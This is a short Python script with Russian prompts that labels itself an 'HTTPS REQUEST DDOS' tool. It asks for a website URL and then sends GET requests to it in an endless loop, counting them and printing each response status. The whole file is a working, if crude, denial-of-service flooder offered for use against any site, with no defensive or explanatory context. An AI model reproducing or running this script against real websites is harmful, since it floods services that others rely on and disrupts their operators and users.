import requests, os, time, colorama
from colorama import Fore, Back, Style, init
from datetime import datetime
x = 0
os.system('cls')
url = str(input(f"{Fore.YELLOW}Введите ссылку на сайт: "))
while True:
  x = x + 1
  os.system(f'title HTTPS REQUEST DDOS / Отправлено запросов: {x} / Дудосим - {url}')
  try:
    date = datetime.now()
    response = requests.get(f"{url}")
    if response.status_code != 403:
      print(f'{Fore.GREEN} {date.hour}:{date.minute}:{date.second} [+] Страница обновлена | [{x}] | {str(response)}')
    elif response.status_code == 403:
      print(f'{Fore.RED} {date.hour}:{date.minute}:{date.second} {Fore.RED} Ошибка! {str(response)} | [{x}]')
  except Exception as c: print(c)